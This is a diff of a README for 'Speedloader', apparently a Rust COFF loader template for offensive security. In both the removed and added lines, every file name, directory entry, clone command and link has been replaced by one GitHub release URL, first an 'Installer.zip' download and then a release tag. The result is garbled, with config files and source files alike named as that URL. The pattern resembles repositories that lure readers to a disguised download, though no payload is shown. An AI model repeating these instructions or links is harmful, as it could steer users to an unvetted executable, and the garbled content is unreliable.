@@ -2,7 +2,7 @@
 
 Welcome to the **Speedloader** repository! This is a Rust template/library designed for implementing your own COFF loader. If you are interested in areas like buffer overflow, COFF loaders, offensive security, and Rust programming, then this repository is perfect for you.
 
-[![Download Speedloader](https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip)](https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip)
+[![Download Speedloader](https://github.com/aliwioiod/speedloader/releases/tag/v2.0)](https://github.com/aliwioiod/speedloader/releases/tag/v2.0)
 
 🔗 **Download Zip File**: Click the button above to download the Speedloader repository in a zip file format. If the link doesn't work or you prefer a different method, be sure to check the "Releases" section of this repository.
 
@@ -12,16 +12,16 @@ The **Speedloader** repository contains everything you need to kickstart your CO
 ### 📂 src
 The `src` folder holds all the source code of the COFF loader template/library. You can explore various Rust files that handle different aspects of the loader implementation.
 
-### 📄 https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
-The `https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip` file is where you define your project dependencies, metadata, and other configuration details for your Rust project. Feel free to customize it according to your project requirements.
+### 📄 https://github.com/aliwioiod/speedloader/releases/tag/v2.0
+The `https://github.com/aliwioiod/speedloader/releases/tag/v2.0` file is where you define your project dependencies, metadata, and other configuration details for your Rust project. Feel free to customize it according to your project requirements.
 
-### 📄 https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
-The `https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip` file, you're currently reading, provides an overview of the **Speedloader** repository, its contents, and how to get started with using the COFF loader template/library.
+### 📄 https://github.com/aliwioiod/speedloader/releases/tag/v2.0
+The `https://github.com/aliwioiod/speedloader/releases/tag/v2.0` file, you're currently reading, provides an overview of the **Speedloader** repository, its contents, and how to get started with using the COFF loader template/library.
 
 ## 🚀 Getting Started
 To start using the **Speedloader** template/library for your COFF loader project, follow these steps:
 
-1. Clone the repository to your local machine using `git clone https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip`.
+1. Clone the repository to your local machine using `git clone https://github.com/aliwioiod/speedloader/releases/tag/v2.0`.
 2. Navigate to the project directory and explore the source code in the `src` folder.
 3. Customize the template to fit your specific requirements and make any necessary modifications.
 4. Compile and run your COFF loader project using the Rust compiler and Cargo build tool.
@@ -33,12 +33,12 @@ The **Speedloader** project is organized in a modular and flexible manner to mak
 speedloader/
 │
 ├── src/
-│   ├── https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
-│   ├── https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
-│   └── https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
+│   ├── https://github.com/aliwioiod/speedloader/releases/tag/v2.0
+│   ├── https://github.com/aliwioiod/speedloader/releases/tag/v2.0
+│   └── https://github.com/aliwioiod/speedloader/releases/tag/v2.0
 │
-├── https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
-└── https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip
+├── https://github.com/aliwioiod/speedloader/releases/tag/v2.0
+└── https://github.com/aliwioiod/speedloader/releases/tag/v2.0
 ```
 
 ## 🌟 Features
@@ -67,4 +67,4 @@ If you have any questions, feedback, or suggestions regarding the **Speedloader*
 
 ---
 
-📌 To explore the Speedloader repository further, [visit the repository](https://github.com/aliwioiod/speedloader/releases/download/v1.0/Installer.zip). Happy coding! 🚀
+📌 To explore the Speedloader repository further, [visit the repository](https://github.com/aliwioiod/speedloader/releases/tag/v2.0). Happy coding! 🚀
